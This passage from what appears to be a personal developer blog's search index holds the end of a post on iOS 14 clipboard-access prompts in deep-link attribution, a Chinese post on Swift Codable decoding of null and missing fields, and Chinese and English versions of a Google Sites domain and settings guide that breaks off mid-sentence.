Deep Link to enhance user experience, as shown in the flow above. When a product offers both a website and an app, we prefer users to install the app (as it increases engagement). Therefore, when users browse the website, we guide them to download the app, and we want the app to automatically open the page they were viewing when they left the website. EX: When I browse the mobile version of PxHome in Safari -&gt; see a product I like and want to buy -&gt; PxHome wants to direct traffic to the app -&gt; download the app -&gt; open the app -&gt; display the product I just saw on the websiteIf this is not done, users would have to either 1. return to the website and click again or 2. search for the product again within the app; either option increases the difficulty and hesitation in making a purchase, which may lead to them not buying at all!From an operational perspective, knowing the source of successful installations is very helpful for marketing and advertising budget allocation.Why use the clipboard? Are there alternative methods?This is a cat-and-mouse game because Apple does not want developers to be able to reverse-track user sources. Before iOS 9, the method was to store information in web cookies, which apps would read after installation. After iOS 10, this method was blocked by Apple, leaving developers with no choice but to resort to the final tactic — “using the clipboard to transmit information.” With iOS 14, Apple introduced a new prompt to make developers uncomfortable.Another route is to use Branch.io to record user profiles (IP, device information) and then read the information in a combined manner. This is theoretically feasible but requires a significant investment of manpower (involving backend, database, and app) to research and implement, and it may lead to misjudgments or collisions. *Android Google has always supported this functionality without the need for the roundabout methods required by iOS.Affected AppsMany app developers may not even realize they have clipboard privacy issues because Google’s Firebase Dynamic Links service also uses the same principle:// Reason for this string to ensure that only FDL links, copied to clipboard by AppPreview Page// JavaScript code, are recognized and used in copy-unique-match process. If user copied FDL to// clipboard by himself, that link must not be used in copy-unique-match process.// This constant must be kept in sync with constant in the server version at// durabledeeplink/click/ios/click_page.js Therefore, any app using Google Firebase Dynamic Links service may be affected by clipboard privacy issues!Personal OpinionThere are indeed security issues, but it ultimately comes down to trust. Trusting developers to do the right thing; if developers want to do harm, there are many other ways to do so, such as stealing credit card information or recording real passwords, which are much more effective than this. The purpose of the prompt is to make users aware of when the clipboard is being accessed. If it seems unreasonable, they should be cautious!Reader QuestionsQ: “TikTok’s response to accessing the clipboard is to detect spam behavior.” Is this statement correct?A: Personally, I believe it’s just an excuse to deflect public opinion. TikTok’s intention seems to be “to prevent users from copying and pasting advertising messages everywhere”; however, they could block and filter at the time of message input completion or when sending the message, without needing to constantly monitor the user’s clipboard! Should they also monitor if the clipboard contains advertisements or “sensitive” information? I haven’t pasted anything to publish it.What Developers Can DoIf you don’t have a spare device to upgrade to iOS 14 for testing, you can first download XCode 12 from Apple and test it using the simulator.Everything is still quite new. If you are using Firebase, you can refer to Firebase-iOS-SDK/Issue #5893 to update to the latest SDK.If you are implementing DeepLink yourself, you can refer to the modifications in Firebase-iOS-SDK #PR 5905:Swift:if #available(iOS 10.0, *) { if (UIPasteboard.general.hasURLs) { //UIPasteboard.general.string }} else { //UIPasteboard.general.string}Objective-C:if (@available(iOS 10.0, *)) { if ([[UIPasteboard generalPasteboard] hasURLs]) { //[UIPasteboard generalPasteboard].string; } } else { //[UIPasteboard generalPasteboard].string; } return pasteboardContents;}Check if the clipboard content is a URL (since the content copied from the web is usually a URL with parameters) before reading it, so that the clipboard access prompt does not appear every time the app is opened. For now, this is the only way; the prompt will still appear, but it will be more focused.Additionally, Apple has introduced a new API: DetectPattern, which helps developers more accurately determine if the clipboard information is what they need before reading it and triggering the prompt, allowing users to feel more secure while developers can continue to use this functionality. DetectPattern is still in Beta and can only be implemented in Objective-C.Or… Switch to Branch.io Implement the principles of Branch.io yourself Have the app display a custom alert to inform users before reading the clipboard (to reassure users) Add new privacy terms Use the latest iOS 14 App Clips? Direct users from the web to lightweight App Clips for deeper engagement with the appFurther Reading iOS Deferred Deep Link Implementation (Swift) Using mitmproxy for man-in-the-middle sniffing on iOS and macOS iOS 15 / macOS Monterey Safari will be able to hide real IPIf you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 15,376 Total Views Last Statistics Date: 2025-08-15 | 15,339 Views on Medium." }, { "title": "現實使用 Codable 上遇到的 Decode 問題場景總匯(下)", "url": "/posts/zrealm-dev/%E7%8F%BE%E5%AF%A6%E4%BD%BF%E7%94%A8-codable-%E4%B8%8A%E9%81%87%E5%88%B0%E7%9A%84-decode-%E5%95%8F%E9%A1%8C%E5%A0%B4%E6%99%AF%E7%B8%BD%E5%8C%AF-%E4%B8%8B-cb00b1977537/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, codable, json, core-data", "date": "2020-06-26 01:56:31 +0800", "snippet": "現實使用 Codable 上遇到的 Decode 問題場景總匯(下)合理的處理 Response Null 欄位資料、不一定都要重寫 init decoderPhoto by Zan前言既上篇「 現實使用 Codable 上遇到的 Decode 問題場景總匯 」後，開發進度繼續邁進又遇到了新的場景新的問題，故出了此下篇，繼續把遇到的情景、研究心路都記錄下來，方便日後回頭查閱。前篇主要解決了 ...", "content": "現實使用 Codable 上遇到的 Decode 問題場景總匯(下)合理的處理 Response Null 欄位資料、不一定都要重寫 init decoderPhoto by Zan前言既上篇「 現實使用 Codable 上遇到的 Decode 問題場景總匯 」後，開發進度繼續邁進又遇到了新的場景新的問題，故出了此下篇，繼續把遇到的情景、研究心路都記錄下來，方便日後回頭查閱。前篇主要解決了 JSON String -&gt; Entity Object 的 Decodable Mapping，有了 Entity Object 後我們可以轉換成 Model Object 在程式內傳遞使用、View Model Object 處理資料顯示邏輯…等等； 另一方面我們需要將 Entity 轉換成 NSManagedObject 存入本地 Core Data 中 。主要問題假設我們的歌曲 Entity 結構如下：struct Song: Decodable { var id: Int var name: String? var file: String? var converImage: String? var likeCount: Int? var like: Bool? var length: Int?}因 API EndPoint 並不一定會回傳完整資料欄位(只有 id 是一定會給)，所以除 id 之外的欄位都是 Optional；例如：取得歌曲資訊的時候會回傳完整結構，但若是對歌曲收藏喜歡時僅會回傳 id 、 likeCount 、 like 三個有關聯更動的欄位資料。我們希望 API Response 有什麼欄位資料都能一併存入 Core Data 裡，如果資料已存在就更新變動的欄位資料（incremental update）。 但此時問題就出現了：Codable Decode 換成 Entity Object 後我們無法區別 「資料欄位是想要設成 nil」 還是 「Response 沒給」A Response:{ \"id\": 1, \"file\": null}對於 A Response、B Response 的 file 來說都是 null 、但意義不一一樣 ；A 是想把 file 欄位設為 null (清空原本資料)、 B 是想 update 其他資料，單純沒給 file 欄位而已。 Swift 社群有開發者提出 增加類似 date Strategy 的 null Strategy 在 JSONDecoder 中 ，讓我們能區分以上狀況，但目前沒有計畫要加入。解決方案如前所述，我們的架構是JSON String -&gt; Entity Object -&gt; NSManagedObject，所以當拿到 Entity Object 時已經是 Decode 後的結果了，沒有 raw data 可以操作；這邊當然可以拿原始 JSON String 比對操作，但與其這樣不如不要用 Codable。首先參考 上一篇 使用 Associated Value Enum 當容器裝值。enum OptionalValue&lt;T: Decodable&gt;: Decodable { case null case value(T) init(from decoder: Decoder) throws { let container = try decoder.singleValueContainer() if let value = try? container.decode(T.self) { self = .value(value) } else { self = .null } }}使用泛型，T 為真實資料欄位型別；.value(T) 能放 Decode 出來的值、.null 則代表值是 null。struct Song: Decodable { enum CodingKeys: String, CodingKey { case id case file } var id: Int var file: OptionalValue&lt;String&gt;? init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) self.id = try container.decode(Int.self, forKey: .id) if container.contains(.file) { self.file = try container.decode(OptionalValue&lt;String&gt;.self, forKey: .file) } else { self.file = nil } }}var jsonData = \"\"\"{ \"id\":1}\"\"\".data(using: .utf8)!var result = try! JSONDecoder().decode(Song.self, from: jsonData)print(result)jsonData = \"\"\"{ \"id\":1, \"file\":null}\"\"\".data(using: .utf8)!result = try! JSONDecoder().decode(Song.self, from: jsonData)print(result)jsonData = \"\"\"{ \"id\":1, \"file\":\\\"https://test.com/m.mp3\\\"}\"\"\".data(using: .utf8)!result = try! JSONDecoder().decode(Song.self, from: jsonData)print(result) 範例先簡化成只有 id 、 file 兩個資料欄位。Song Entity 自行複寫實踐 Decode 方式，使用 contains(.KEY) 方法判斷 Response 有無給該欄位(無論值是什麼)，如果有就 Decode 成 OptionalVale ；OptionalValue Enum 中會再對真正我們要的值做 Decode ，如果有值 Decode 成功則會放在 .value(T) 、如果給的值是 null (或 decode 失敗)則放在 .null 。 Response 有給欄位&amp;值時：OptionalValue.value(VALUE) Response 有給欄位&amp;值是 null 時：OptionalValue.null Response 沒給欄位時：nil 這樣就能區分出是有給欄位還是沒給欄位，後續要寫入 Core Data 時就能判斷是要更新欄位成 null、還是沒有要更新此欄位。其他研究 — Double Optional ❌Optional!Optional! 在 Swift 上就很適合處理這個場景。struct Song: Decodable { var id: Int var name: String?? var file: String?? var converImage: String?? var likeCount: Int?? var like: Bool?? var length: Int??} Response 有給欄位&amp;值時：Optional(VALUE) Response 有給欄位&amp;值是 null 時：Optional(nil) Response 沒給欄位時：nil但是….Codable JSONDecoder Decode 對 Double Optional 跟 Optional 都是 decodeIfPresent 在處理，都視為 Optional ，不會特別處理 Double Optional；所以結果跟原本一樣。其他研究 — Property Wrapper ❌本來預想可以用 Property Wrapper 做優雅的封裝，例如：@OptionalValue var file: String?但還沒開始研究細節就發現有 Property Wrapper 標記的 Codable Property 欄位，API Response 就必須要有該欄位，否則會出現 keyNotFound error，即使該欄位是 Optional。?????官方論壇也有針對此問題的 討論串 …估計之後會修正。 所以選用 BetterCodable 、 CodableWrappers 這類套件的時候要考慮到目前 Property Wrapper 的這個問題。其他問題場景1.API Response 使用 0/1 代表 Bool，該如何 Decode?import Foundationstruct Song: Decodable { enum CodingKeys: String, CodingKey { case id case name case like } var id: Int var name: String? var like: Bool? init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) self.id = try container.decode(Int.self, forKey: .id) self.name = try container.decodeIfPresent(String.self, forKey: .name) if let intValue = try container.decodeIfPresent(Int.self, forKey: .like) { self.like = (intValue == 1) ? true : false } else if let boolValue = try container.decodeIfPresent(Bool.self, forKey: .like) { self.like = boolValue } }}var jsonData = \"\"\"{ \"id\": 1, \"name\": \"告五人\", \"like\": 0}\"\"\".data(using: .utf8)!var result = try! JSONDecoder().decode(Song.self, from: jsonData)print(result)延伸前篇，我們可以自己在 init Decode 中，Decode 成 int/Bool 然後自己賦值、這樣就能擴充原本的欄位能接受 0/1/true/false了。2.不想要每每都要重寫 init decoder在不想要自幹 Decoder 的情況下，複寫原本的 JSON Decoder 擴充更多功能。我們可以自行 extenstion KeyedDecodingContainer 對 public 方法自行定義，swift 會優先執行 module 下我們重定義的方法，複寫掉原本 Foundation 的實作。 影響的就是整個 module。 且不是真的 override，無法 call super.decode，也要小心不要自己 call 自己(EX: decode(Bool.Type,for:key) in decode(Bool.Type,for:key) )decode 有兩個方法： decode(Type, forKey:) 處理非 Optional 資料欄位 decodeIfPresent(Type, forKey:) 處理 Optional 資料欄位範例1. 前述的主要問題就我們可以直接 extenstion：extension KeyedDecodingContainer { public func decodeIfPresent&lt;T&gt;(_ type: T.Type, forKey key: Self.Key) throws -&gt; T? where T : Decodable { //better: switch type { case is OptionalValue&lt;String&gt;.Type, is OptionalValue&lt;Int&gt;.Type: return try? decode(type, forKey: key) default: return nil } // or just return try? decode(type, forKey: key) }}struct Song: Decodable { var id: Int var file: OptionalValue&lt;String&gt;?}因主要問題是 Optional 資料欄位、Decodable 類型，所以我們複寫的是 decodeIfPresent&lt;T: Decodable&gt; 這個方法。這邊推測原本 decodeIfPresent 的實作是，如果資料是 null 或 Response 未給 會直接 return nil，並不會真的跑 decode。所以原理也很簡單，只要 Decodable Type 是 OptionValue 則不論如何都 decode 看看，我們才能拿到不同狀態結果；但其實不判斷 Decodable Type 也行，那就是所有 Optional 欄位都會試著 Decode。範例2. 問題場景1 也能用此方法擴充：extension KeyedDecodingContainer { public func decodeIfPresent(_ type: Bool.Type, forKey key: KeyedDecodingContainer&lt;K&gt;.Key) throws -&gt; Bool? { if let intValue = try? decodeIfPresent(Int.self, forKey: key) { return (intValue == 1) ? (true) : (false) } else if let boolValue = try? decodeIfPresent(Bool.self, forKey: key) { return boolValue } return nil }}struct Song: Decodable { enum CodingKeys: String, CodingKey { case id case name case like } var id: Int var name: String? var like: Bool?}var jsonData = \"\"\"{ \"id\": 1, \"name\": \"告五人\", \"like\": 1}\"\"\".data(using: .utf8)!var result = try! JSONDecoder().decode(Song.self, from: jsonData)print(result)結語Codable 在使用上的各種奇技淫巧都用的差不多了，有些其實很繞，因為 Codable 的約束性實在太強、犧牲許多現實開發上需要的彈性；做到最後甚至開始思考為何當初要選擇 Codable，優點越做越少….參考資料 或许你并不需要重写 init(from:)方法回看 現實使用 Codable 上遇到的 Decode 問題場景總匯(上)有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,823 Total Views Last Statistics Date: 2025-08-15 | 1,662 Views on Medium." }, { "title": "使用 Google Site 建立個人網站還跟得上時代嗎？", "url": "/posts/zrealm-life/%E4%BD%BF%E7%94%A8-google-site-%E5%BB%BA%E7%AB%8B%E5%80%8B%E4%BA%BA%E7%B6%B2%E7%AB%99%E9%82%84%E8%B7%9F%E5%BE%97%E4%B8%8A%E6%99%82%E4%BB%A3%E5%97%8E-724a7fb9a364/", "categories": "ZRealm Life.", "tags": "google, google-sites, web-development, 生活, domain-names", "date": "2020-06-17 23:53:54 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.使用 Google Site 建立個人網站還跟得上時代嗎？新 Google Site 個人網站建立經驗及設定教學Update 2022–07–17目前已透過我自己撰寫的 ZMediumToMarkdown 工具將 Medium...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.使用 Google Site 建立個人網站還跟得上時代嗎？新 Google Site 個人網站建立經驗及設定教學Update 2022–07–17目前已透過我自己撰寫的 ZMediumToMarkdown 工具將 Medium 文章打包下載並轉換為 Markdown 格式，搬遷到 Jekyll。zhgchg.li 手把手無痛轉移教學可點此 🚀🚀🚀🚀🚀===起源去年換工作時，很「虛花」的註冊了個 域名 來做個人履歷的導向連結；時隔半年想說讓域名更有用一些能放更多資訊、另一方面也是一直在尋覓第二網站備份 Medium 上已發表的文章，以防有個萬一。期望功能 可有自訂頁面 跟 Medium 一樣的流暢寫作介面 互動功能（按讚/留言/追蹤） SEO結構好 輕量載入快 能綁定自己的網域 侵入性低 (廣告侵入性、網站標注) 建置容易架站選擇 自架 WordPress 很久以前租過主機、網域，使用 WordPress 架過個人網站；從架設到調整到自己喜愛的版面樣式、安裝 Plugin/甚至自己開發缺少的 Plugin 完以後，我已沒有心力寫作，而且覺得很笨重、載入速度/SEO 也不如 Medium，要再繼續花時間調校，那就更沒有寫作的心力了。 Matters/簡書…之類 跟 Medium 平台差不多，因我不考慮盈利方面，不適合。 wix/weebly 太偏商業網站，且免費版侵入性太強 Google Site（本篇） Github Pages + Jekyll 還在找 &gt;&gt;&gt; 歡迎提供建議關於 Google Site大約 2010 年時有用過舊版的 Google Site，當初拿來做個人網站的 -&gt; 檔案下載中心頁面；印象已有點模糊，只記得那時候的版面很笨重、介面用起來也很不順；事隔 10 年，我本來以為這個服務已經收收掉了，無意間喵到有網域投資者，拿來做域名停泊頁放出售聯絡資訊：第一眼看到的時候覺得「哇！視覺不錯，居然為了賣網域弄了個頁面」；仔細一下左下角浮標，才發現「哇！居然是 Google Site 建的」，跟我 10 年前用的介面天差地遠，查了一下才知道 Google Site 沒有停止服務，反而在 2016 年推出全新版本，雖然也距今快五年，但至少介面跟得上時代了！成品展示什麼都先別說，先來看我做的成品，如果你也「心有靈犀」可以考慮使用看看！首頁個人簡歷頁城市一隅(瀑布流相片呈現)文章目錄(連回 Medium)與我聯絡 (內嵌 Google 表單)何不試試？節省閱讀時間，我 先講結論；我依然在尋找更合適的服務選項 ，雖然他有在持續維護更新功能，但 Google Site 有幾個對我很重要點需求無法滿足，以下列舉我在使用上遇到的致命缺點。致命缺點 程式碼高亮功能缺陷 功能只有 Code Block 底色反灰顯示 不會變色，若要嵌入 Gist 只能使用 Embed JavaScript (iframe)，但 Google Site 沒有特別處理，高度無法隨頁面縮放進行改變，要馬空白太多、要馬手機小螢幕上會出現裡外兩個 ScrollBar，非常醜也不好閱讀。 SEO 結構基本為零 「驚不驚喜、益不意外?」Google 自己的服務結果 SEO 結構跟💩ㄧ樣，不給客製任何 head meta (description/tag/og:) 先別管 SEO 收錄排名，光把自己的網站貼到 Line/Facebook 等社群，沒有任何預覽資訊，只有醜醜的網址跟網站名稱而已。優點1.侵入性低，僅左下會有懸浮驚嘆號點了才會顯示「Google 協作平台 檢舉濫用」2.介面易用，右邊元件拉一拉就能快速建立頁面類似 wix/weebly. .or cakeresume? 版面配置、元件拉一拉填一填就完成了！3. 支援 RWD、內建搜尋、導航列4.支援 Landing Page5.流量無特別限制、容量按照創建者的 Google Drive 容量上限6. 🌟 可綁定自己的網域7. 🌟 可直接串GA分析訪客8. 官方社群 會收集意見、持續維護更新9. 支援公告提示10. 🌟 無痛完美嵌入 Youtube、Google 表單、Google 簡報、Google 文件、Google 行事曆、 Google 地圖，且支援 RWD 電腦/手機瀏覽11. 🌟 頁面內容支援 JavaScript/Html/CSS 內嵌12. 網址乾淨簡潔(http://example.com/頁面名/子頁面名)、頁面路徑名可自訂13. 🌟 頁面排版有參考線/自動對齊，非常貼心拖曳元件位置會出現參考對齊線適用網站我覺得 Google Site 只適合非常輕量的網頁服務，例如學校社團、小活動的網頁、個人簡歷。一些設定教學列舉一些自己在使用上遇到＆解決的問題；其他都是所見即所得的操作，沒有什麼好紀錄的。如何綁定個人網域？1. 前往 http://google.com/webmasters/verification 2. 點擊「 新增資源 」輸入「 您的網域」 點擊 「繼續」3. 選擇您的「 網域服務供應商 」複製 「 DNS 設定驗證字串 」4. 前往網域服務供應商的網站 (這邊以 Namecheap.com 為例，大同小異)在 DNS 設定區塊新增一筆紀錄，類型選「 TXT Record 」、主機輸入「 @ 」、值輸入 剛複製的DNS 設定驗證字串 ，按新增送出。再新增一筆紀錄，類型選「 CNAME Record 」、主機輸入「 www (或你想用的子網域) 」、值輸入「 ghs.googlehosted.com. 」按新增送出。 另外也可多轉址 http://zhgchg.li -&gt; http://www.zhgchg.li 這邊設定完需要稍等一下…等待 DNS 紀錄生效。。。5. 回到 Google Master 按驗證 若出現 「驗證資源失敗」 別急！請再稍等一下，如果超過 1 小時都還是無法，再回頭檢查一下設定是否有誤。成功驗證網域所有權6. 回到您的 Google Site 設定頁面點擊右上角「 齒輪(設定) 」選擇「 自訂網址 」輸入想要指派的網域名稱，或你想用的子網域，按「 指派 。指派成功後關閉設定視窗，點擊右上角的「 發布 」發布。 這邊一樣需要稍等一下…等待 DNS 紀錄生效。。。7. 新開一個瀏覽器輸入網址試試看能不能正常瀏覽 若出現 「網頁無法開啟」 別急！請再稍等一下，如果超過 1 小時都還是無法，再回頭檢查一下設定是否有誤。完成!子頁面、頁面路徑設定再導航列目錄子頁面會自動聚集顯示如何設定？右方切換到「頁面」頁籤。可新增頁面用拖曳的方式拖到現有頁面下就會變成子頁面、或點擊「…」操作。選擇屬性可自訂頁面路徑。輸入路徑名稱（EX: dev -&gt; http://www.zhgchg.li/dev）頁首頁尾設定1.頁首設定滑鼠移到導航列，選擇「 新增頁首 」新增頁首後滑鼠移到左下角就能變更圖片、輸入標題文字、變更標頭類型2.頁尾設定滑鼠移到頁面底部，選擇「 編輯頁尾 」即可輸入頁尾資訊。 注意！頁尾資訊是全站共用的，所有頁面都會套用同樣的內容！ 也可點左下角的「眼睛」，控制本頁是否要顯示頁尾資訊設定網站 favicon 、標頭名稱、圖示favicon網站標題、Logo如何設定？點擊右上角「 齒輪(設定) 」選擇「 品牌圖片 」即可設定，設定完別忘了回到頁面按「 發布 」才會生效喔！隱藏/顯示頁面最後更新資訊、頁面錨點連結提示最後更新資訊頁面錨點連結提示如何設定？點擊右上角「 齒輪(設定) 」選擇「 檢視者工具 」即可設定，設定完別忘了回到頁面按「 發布 」才會生效喔！串接 GA 分析流量1.前往 https://analytics.google.com/analytics/web/?authuser=0#/provision/SignUp 建立新 GA 帳戶2.建立完成後複製 GA 追蹤 ID3.回到您的 Google Site 設定頁面點擊右上角「 齒輪(設定) 」選擇「 分析 」輸入「 GA 追蹤 ID 」即可設定，設定完別忘了回到頁面按「 發布 」才會生效喔！設定全站/首頁橫幅公告橫幅公告如何設定？點擊右上角「 齒輪(設定) 」選擇「 公告橫幅 」即可設定，設定完別忘了回到頁面按「 發布 」才會生效喔！可指定橫幅訊息內容、顏色、按鈕文字、點擊前往連結、是否在新分頁開啟、設定全站 or 僅首頁顯示。發布設定右上角「發布 ▾」可檢查變更內容並發布。可設定是否讓搜尋引擎收錄及取消每次發布都要先跳檢查內容頁。嵌入 Javascript/HTML/CSS、大量圖片Gist 為例 但如上述致命缺點所說，嵌入 iframe 無法依照網頁大小響應高度。如何插入？選「內嵌」選擇嵌入程式碼可輸入 JavaScript/HTML/CSS，可拿來做自訂樣式的 Button UI。 另外選「圖片」插入可插入多張圖片，會以瀑布流呈現(如上述我的 城市一隅 頁面)。內嵌的 Google 表單無法在頁面直接填寫？這個原因是因為表單題目中有「 檔案上傳 」項目， 因瀏覽器安全性問題無法使用 iframe 嵌入在其他頁面中 ；所以會變成只顯示問券資訊然後要點擊填寫按鈕新開視窗前往填寫內容。解決辦法只有拿掉檔案上傳的問題，就能直接在頁面內進行填寫了。按鈕元件網址內容不能輸入錨點EX: #lifesection，我想拿來放頁面上方，做目錄索引瀏覽或頁底做 GoTop 按鈕查了下官方社群，目前不行，按鈕的連結就只能 1.輸入外部連結在新視窗中開啟或 2. 指定內部頁面，所以我後來用子頁面的方式來拆分目錄了。延伸閱讀 [生產力工具] 拋棄 Chrome 投入 Sidekick 瀏覽器的懷抱有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 20,285 Total Views Last Statistics Date: 2025-08-15 | 20,157 Views on Medium." }, { "title": "Is Using Google Sites to Build a Personal Website Still Relevant?", "url": "/posts/zrealm-life/en/is-using-google-sites-to-build-a-personal-website-still-relevant-724a7fb9a364/", "categories": "ZRealm Life.", "tags": "google, google-sites, web-development, life, domain-names", "date": "2020-06-17 23:53:54 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Is Using Google Sites to Build a Personal Website Still Relevant?Experience and setu...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Is Using Google Sites to Build a Personal Website Still Relevant?Experience and setup guide for creating a personal website with the new Google Sites.Update 2022–07–17I have successfully packaged and downloaded my Medium articles using my own tool, ZMediumToMarkdown, and converted them to Markdown format for migration to Jekyll.zhgchg.li Click here for a step-by-step painless migration guide 🚀🚀🚀🚀🚀===BackgroundLast year, when I changed jobs, I whimsically registered a domain to serve as a link to my personal resume. After six months, I thought it would be more useful to provide more information. Additionally, I was looking for a backup site for the articles I had published on Medium, just in case.Desired Features Customizable pages A smooth writing interface similar to Medium Interactive features (likes/comments/following) Good SEO structure Lightweight and fast loading Ability to bind my own domain Low intrusiveness (advertising and site branding) Easy to set upOptions for Building a Website Self-hosted WordPressI used to rent a server and domain a long time ago and built a personal website with WordPress. After setting it up, customizing the layout, installing plugins, and even developing missing plugins, I found I had no energy left for writing. It felt heavy, and the loading speed/SEO was not as good as Medium. If I continued to spend time tweaking it, I would have even less motivation to write. Platforms like Matters/JianshuSimilar to Medium, but since I’m not considering monetization, they are not suitable for me. Wix/WeeblyToo commercial-focused, and the free versions are too intrusive. Google Sites (this article) GitHub Pages + Jekyll Still searching »&gt; Suggestions welcome!About Google SitesI used the old version of Google Sites around 2010 to create a personal website and a file download center. My memory is a bit hazy, but I remember the interface being clunky and not user-friendly. Ten years later, I thought this service had been discontinued, but I stumbled upon a domain investor using it to create a landing page with contact information for selling the domain:At first glance, I thought, “Wow! This looks nice; they made a page to sell the domain.” Upon closer inspection of the bottom left corner, I realized, “Wow! This is built with Google Sites.” The interface is worlds apart from what I used ten years ago. I found out that Google Sites has not been discontinued; instead, a new version was launched in 2016. Although it’s been almost five years, at least the interface has kept up with the times!Showcase of My WorkBefore saying anything else, let’s take a look at the product I created. If you resonate with it, you might want to give it a try!HomeResume PageCity Corner (Masonry Photo Display)Article Directory (Linking Back to Medium)Contact Me (Embedded Google Form)Why Not Give It a Try?To save reading time, I’ll get straight to the conclusion: I am still looking for a more suitable service option. Although Google Sites continues to maintain and update its features, there are several critical needs that it fails to meet for me. Here are some fatal drawbacks I encountered while using it.Fatal Drawbacks Code Highlighting IssuesThe feature only provides a gray background for Code Blocks without color changes. If you want to embed Gist, you can only use Embed JavaScript (iframe), but Google Sites does not handle this well. The height cannot adjust with the page scaling, resulting in either too much blank space or two scroll bars on small mobile screens, which is very unattractive and hard to read. Basic SEO Structure is Nonexistent“Surprised? Not really?” The SEO structure of Google’s own service is as bad as 💩. It doesn’t allow any customization of head meta (description/tag/og:). Forget about SEO indexing and ranking; just sharing your website on Line/Facebook and other social media provides no preview information, only an ugly URL and the website name.Advantages1. Low intrusiveness; only a floating exclamation mark in the bottom left corner that shows “Google Collaboration Platform Report Abuse” when clicked.2. User-friendly interface; components can be easily dragged and dropped to quickly create pages.Similar to Wix/Weebly or Cakeresume, just drag and drop components to complete the layout!3. Supports RWD, built-in search, and navigation bar.4. Supports Landing Pages.5. No special traffic limits; storage is based on the creator’s Google Drive capacity.6. 🌟 Can bind your own domain.7. 🌟 Can directly integrate GA for visitor analysis.8. Official community collects feedback and continues to maintain updates.9. Supports announcement prompts.10. 🌟 Seamlessly embed YouTube, Google Forms, Google Slides, Google Docs, Google Calendar, Google Maps, and supports RWD for both desktop and mobile browsing.11. 🌟 Page content supports embedded JavaScript/HTML/CSS.12. Clean and simple URLs (http://example.com/page-name/sub-page-name), and page path names can be customized.13. 🌟 Page layout has reference lines/auto-alignment, which is very thoughtful.Dragging components shows reference alignment lines.Suitable WebsitesI believe Google Sites is only suitable for very lightweight web services, such as school clubs, small event pages, or personal resumes.Some Setup GuidesHere are some issues I encountered and solved while using it; the rest are straightforward operations with a WYSIWYG interface, so there’s not much to document.How to Bind a Personal Domain?1. Go to http://google.com/webmasters/verification2. Click “ Add Property “ and enter “ Your Domain “, then click “Continue”.3. Choose your “ Domain Service Provider “ and copy the “ DNS Verification String “.4. Go to your domain service provider’s website (using Namecheap.com as an example; the process is similar).In the DNS settings section, add a record, select “ TXT Record “, enter “ @ “ for the host, and paste the DNS Verification String you just copied, then submit.Next, add another record, select “ CNAME Record “, enter “ www (or your desired subdomain) “ for the host, and input “ ghs.googlehosted.com. “, then submit. You can also redirect http://zhgchg.li to http://www.zhgchg.li. After setting this up, you’ll need to wait a bit for the DNS records to take effect…5. Return to Google Master and click verify. If you see “ Verification of resource failed “, don’t worry! Just wait a bit longer. If it’s still not working after an hour, double-check your settings for any errors.Successfully verified domain ownership.6. Return to your Google Site settings page.Click the gear icon (settings) in the upper right corner, select “ Custom URL “, enter the domain name you want to assign or the subdomain you wish to use, and click “ Assign “.After successful assignment, close the settings window and click “ Publish “ in the upper right corner to publish. You’ll also need to wait a bit for the DNS records to take effect…7. Open a new browser and enter the URL to see if it works. If you see “ The webpage cannot be opened “, don’t worry! Just wait a bit longer. If it’s still not working after an hour, double-check your settings for any errors.Done!Subpages and Page Path SettingsSubpages will automatically cluster in the navigation menu.How to set it up?Switch to the “Pages” tab on the right.You can add a page and drag it under an existing page to make it a subpage, or click “…” for options.Select properties to customize the page path.Enter the path name (e.g., dev -&gt; http://www.zhgchg.li/dev).Header and Footer Settings1. Header SettingsHover over the navigation bar and select “ Add Header “.After adding a header, hover over the bottom left corner to change the image, enter the title text, and change the header type.2. Footer SettingsHover over the bottom of the page and select “ Edit Footer “ to enter footer information. Note! The footer information is shared across the entire site, and all pages will apply the same content! You can also click the eye icon in the bottom left corner to control whether to display footer information on this page.Setting the Website Favicon, Header Name, and IconFavicon.Website Title, Logo.How to set it up?Click the gear icon (settings) in the upper right corner and select “ Brand Image “ to set it up. Don’t forget to return to the page and click “ Publish “ for the changes to take effect!Hiding/Showing Last Updated Information and Page Anchor Link PromptsLast Updated Information.Page Anchor Link Prompt.How to set it up?Click the gear icon (settings) in the upper right corner and select “ Viewer Tools “ to set it up. Don’t forget to return to the page and click “ Publish “ for the changes to take effect!Integrating GA for Traffic Analysis1. Go to https://analytics.google.com/analytics/web/?authuser=0#/provision/SignUp to create a new GA account.2. After creation, copy the GA Tracking ID.3. Return to your Google Site settings page.Click the gear icon in the upper right corner ( Settings ) and select Analytics to enter your GA Tracking ID. Don’t forget to return to the page and click Publish for the changes to take effect!Setting Up Sitewide/Homepage Banner AnnouncementsBanner AnnouncementHow to Set It Up?Click the gear icon in the upper right corner ( Settings ) and select Announcement Banner to set it up. After configuring, remember to return to the page and click Publish for it to take effect!You can specify the banner message content, colors, button text, the link to navigate to, whether to open in a new tab, and whether to display sitewide or only on the homepage.Publishing SettingsPublish in the upper right cornerYou can review the changes and publish them.You can set whether to allow search engines to index the site and disable the content review page that appears before each publication.Embedding Javascript/HTML/CSS and Multiple ImagesExample with Gist However, as mentioned in the critical drawbacks above, embedding an iframe cannot adjust its height responsively based on the webpage size.How to Insert?Select “Embed”Choose Embed CodeYou can input JavaScript/HTML/CSS to create custom styled Button UI. Additionally, selecting “Image” allows you to insert multiple images, which will be displayed in a waterfall layout (like my City Corner page above).Can’t Fill Out Embedded Google Forms Directly on the Page?This is because the form includes a File Upload question, which cannot be embedded in other pages using 